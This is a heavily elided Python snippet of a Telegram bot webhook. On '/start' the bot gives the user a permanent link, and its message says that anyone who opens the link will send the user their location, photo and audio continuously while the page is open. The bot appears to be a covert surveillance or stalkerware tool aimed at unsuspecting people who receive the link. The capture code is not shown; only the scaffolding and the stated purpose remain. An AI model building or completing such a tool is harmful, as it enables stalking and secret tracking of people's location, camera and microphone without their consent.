...
def webhook():
    ...
    try:
        ...
        if update.message and update.message.text and update.message.text.startswith('/start'):
            ...
            # Use persistent session: same link for this user every time
            ...
            edit_message_text(chat_id, message_id, f"✅ Your permanent link is ready:\n{link}\n\nShare this link. Anyone opening it will send you location, photo & audio continuously while the page is open.")
        return "ok"
...
def set_webhook():
    ...
    requests.post(f"{TG_API}/setWebhook", json={"url": webhook_url})
